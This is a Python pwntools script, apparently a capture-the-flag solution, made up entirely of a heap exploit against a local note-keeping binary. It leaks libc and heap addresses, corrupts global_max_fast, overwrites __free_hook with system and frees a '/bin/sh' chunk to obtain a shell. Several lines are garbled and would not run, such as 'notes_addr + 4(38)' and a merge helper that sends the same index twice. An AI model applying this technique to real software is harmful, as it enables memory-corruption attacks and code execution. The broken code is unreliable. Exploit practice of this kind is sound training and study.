#python 
from pwn import *
context.log_level = 'debug'
io = process('./unbin') 
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def Menu(cmd): 
	io.recvuntil('Choice >>') 
	io.sendline(str(cmd))
def Insert(data): 
	Menu(1) 
	io.recvuntil('size:') 
	io.sendline(str(len(data))) 
	io.recvuntil('data:') 
	io.send(data)
def View(idx): 
	Menu(2) 
	io.recvuntil('index:') 
	io.sendline(str(idx))
def List(): 
	Menu(3)
def Delete(idx): 
	Menu(4) 
	io.recvuntil('index:') 
	io.sendline(str(idx))
def Merge(idx1, idx2): 
	Menu(5) 
	io.recvuntil('from note:') 
	io.sendline(str(idx1)) 
	io.recvuntil('to note:') 
	io.sendline(str(idx1))
def Update(idx, data): 
	Menu(6) 
	io.recvuntil('index:') 
	io.sendline(str(idx)) 
	io.recvuntil('size:') 
	io.sendline(str(len(data))) 
	io.recvuntil('data:') 
	io.send(data)

Insert('A'*8) 
Insert('/bin/sh\x00') 
Insert('B'*8) 
Insert('D'*8) 
Insert('E'*0x91)
List() 
io.recvuntil('0x') 
content = io.recvuntil(' ')[:-2] 
binary_base = int(content, 16) - 0x203060 
log.info('binary_base = ' + hex(binary_base))
Delete(0) 
Merge(2, 2)
View(0) 
io.recvuntil('Note.0 :')
heap_base = u64(io.recvn(8)) 
log.info('heap_base = ' + hex(heap_base))
bins_addr = u64(io.recvn(8)) 
libc_base = bins_addr - 0x3c4b78 
log.info('libc_base = ' + hex(libc_base))
global_max_fast_addr = libc_base + 0x3c67f8 
log.info('global_max_fast_addr = ' + hex(global_max_fast_addr))
Update(0, '\x00'*8 + p64(global_max_fast_addr - 0x10))
Insert('A'*8) 
Insert('B'*8)
Merge(5, 5)
notes_addr = binary_base + 0x203060 

Update('6', p64(notes_addr + 4(38)))

Insert('C'*8) 
Insert('D'8*10)
View('7') 
io.recvuntil('Note.7 :') 
io.recvn(0x48) 
ptr = u64(io.recvn(8)) 

random = ptr ^ (notes_addr + 4(38) + 0x10) 

log.info('random = ' + hex(random))
free_hook_addr = libc_base + libc.symbols['__free_hook'] 
system_addr = libc_base + libc.symbols['system']
payload = '' 
payload += 'A'*8 
payload += p64(1) + p64(8) 
payload += p64(free_hook_addr ^ random) 
Update('7', payload)
Update('5', p64(system_addr)) 
Delete('1')
io.interactive()